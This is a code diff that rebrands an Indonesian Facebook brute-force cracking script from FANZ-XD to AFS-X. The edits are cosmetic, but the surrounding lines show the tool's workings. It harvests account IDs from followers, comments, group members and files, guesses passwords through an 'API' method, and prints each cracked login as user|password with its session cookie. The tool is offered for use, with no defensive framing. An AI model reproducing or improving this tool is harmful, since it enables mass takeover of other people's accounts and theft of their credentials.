@@ -173,10 +173,9 @@ class Logo:
 	###----------[ LOGO ]---------- ###
 	def logonya(self):
 		self.bersihkan_layar()
-		prints(Panel(f"""\t{color_text}
-                     ╔═╗┬ ┬┬┌─┐┬ ┬┬┌─┐┌─┐┌┬┐┬   ═╗ ╦
-                     ╚═╗├─┤│└─┐├─┤││ ┬├─┤││││───╔╩╦╝
-    		     ╚═╝┴ ┴┴└─┘┴ ┴┴└─┘┴ ┴┴ ┴┴   ╩ ╚═                     
+		prints(Panel(f"""\t{color_text}╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╔═╗╔╗
+   ╠╩╗╠╦╝║ ║ ║ ║╣   ╠╣ ╠╩╗  | AFSX-X
+\t╚═╝╩╚═╚═╝ ╩ ╚═╝  ╚  ╚═╝  | SCRIPT FREE
 \tMULTI BRUTE FORCE FACEBOOK V0. 4""",width=80,style=f"{color_panel}"))
 	
 ###----------[ BAGIAN LOGIN ]---------- ###
@@ -283,7 +282,7 @@ class Menu:
 		
 		###----------[ PANEL BIASA ]---------- ###
 		prints(Panel(f"""{P2}User    : {H2}{nama}\n{P2}Ip Kamu : {H2}{self.ip}\n{P2}Negara  : {H2}{self.negara}""",width=80,style=f"{color_panel}"))
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. Crack Dari Id Publik   [{color_text}05{P2}]. Crack Dari Random Username
+		prints(Panel(f"""{P2}[{color_text}01{P2}]. Crack Dari ID Publik   [{color_text}05{P2}]. Crack Dari Random Username
 [{color_text}02{P2}]. Crack Dari Pengikut    [{color_text}06{P2}]. Crack Dari Pencarian Nama
 [{color_text}03{P2}]. Crack Dari Komentar    [{color_text}07{P2}]. Crack Dari Member Grup
 [{color_text}04{P2}]. Crack Dari Random Mail [{color_text}08{P2}]. Crack Dari File""",width=80,padding=(0,7),style=f"{color_panel}"))
@@ -340,14 +339,14 @@ class Menu:
 		
 		###----------[ MEMBER GRUP ]---------- ###
 		elif menu in["7","07"]:
-			prints(Panel(f"""{P2}Masukan Id Grup, Pastikan Grup Bersifat Publik Dan Tidak Private""",width=80,style=f"{color_panel}"))
+			prints(Panel(f"""{P2}Masukan ID Grup, Pastikan Grup Bersifat Publik Dan Tidak Private""",width=80,style=f"{color_panel}"))
 			user = console.input(f"{M2}└── {P2}Masukan Id Grup : ")
 			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
 			Crack().atursandi()
 			
 		###----------[ FILE MASSAL ]---------- ###
 		elif menu in["8","08"]:
-			prints(Panel(f"""{P2}masukan Nama File, Pastikan Sudah Beri Izin Untuk Penyimpanan Internal""",width=80,style=f"{color_panel}"))
+			prints(Panel(f"""{P2}Masukan Nama File, Pastikan Sudah Beri Izin Untuk Penyimpanan Internal""",width=80,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}Masukan Nama File : ")
 			Dump(cookie).Dump_File(user)
 			Crack().atursandi()
@@ -577,7 +576,7 @@ class Crack:
 							
 	###----------[ METODE API ]---------- ###
 	def metode_api(self,email,pwx):
-		prog.update(des,description=f" {H2}•{P2} crack {H2}aman{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
+		prog.update(des,description=f" {H2}•{P2} Crack {H2}Aman{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
 		prog.advance(des)
 		try:
 			for pw in pwx:
@@ -616,7 +615,7 @@ class Crack:
 						if "muncul" in self.apk:
 							self.get_apk(user,pw,cookie)
 						else:
-							print(f' [{h}FANZ OK{x}]')
+							print(f' [{h}AFS-X OK{x}]')
 							tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 							tree.add(Panel(f"{H2}{cookie}{P2}\n• {H2}{ua}{P2}",style=f"{color_panel}"))
 							prints(tree)
@@ -627,7 +626,7 @@ class Crack:
 					if user in self.ok or user in self.cp:
 						break
 					else:
-						print(f' [{k}FANZ CP{x}]')
+						print(f' [{k}AFS-X CP{x}]')
 						self.cp.append(user)
 						tree = Tree(Panel.fit(f"""{K2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 						tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
@@ -732,7 +731,7 @@ class Lain:
 		
 	###----------[ MENU ]---------- ###
 	def menu(self):
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. Result Akun Hasil Crack\n[{color_text}02{P2}]. Ganti Warna Tema FANZ-XD\n[{color_text}03{P2}]. Logout ({M2}hapus login{P2})""",width=80,padding=(0,7),style=f"{color_panel}"))
+		prints(Panel(f"""{P2}[{color_text}01{P2}]. Result Akun Hasil Crack\n[{color_text}02{P2}]. Ganti Warna Tema AFS-X\n[{color_text}03{P2}]. Logout ({M2}Hapus Cookie{P2})""",width=80,padding=(0,7),style=f"{color_panel}"))
 		menu = console.input(f" {H2}• {P2}pilih menu : ")
 		if menu in["01","1"]:
 			self.cek_hasil()
@@ -744,7 +743,7 @@ class Lain:
 			os.system("rm data/cookie")
 			exit(prints(Panel(f"""{H2}Berhasil Menghapus Cookie, Silahkan Ketik Ulang python Run.py""",width=80,style=f"{color_panel}")))
 		else:
-			exit(prints(Panel(f"""{M2}maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
+			exit(prints(Panel(f"""{M2}Maaf Fitur Ini Belum Tersedia, Silahkan Menunggu Update Selanjutnya""",width=80,style=f"{color_panel}")))
 
 	###----------[ CEK HASIL CRACK ]---------- ###
 	def cek_hasil(self):
@@ -798,7 +797,7 @@ class Lain:
 [{color_text}02{P2}]. Ganti Warna Tema Hijau  [{color_text}07{P2}]. Ganti Warna Tema Cyan
 [{color_text}03{P2}]. Ganti Warna Tema Kuning [{color_text}08{P2}]. Ganti Warna Tema Putih
 [{color_text}04{P2}]. Ganti Warna Tema Biru   [{color_text}09{P2}]. Ganti Warna Tema Orange
-[{color_text}05{P2}]. Ganti Warna Tema Ungu   [{color_text}10{P2}]. Ganti Warna Tema Abu2""",width=80,padding=(0,7),style=f"{color_panel}"))
+[{color_text}05{P2}]. Ganti Warna Tema Ungu   [{color_text}10{P2}]. Ganti Warna Tema Abu²""",width=80,padding=(0,7),style=f"{color_panel}"))
 		ask = console.input(f"{M2}└── {P2}Pilih Tema : ")
 		if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
 		elif ask in["02","2"]:warna = "[#00FF00]";teks="hijau"
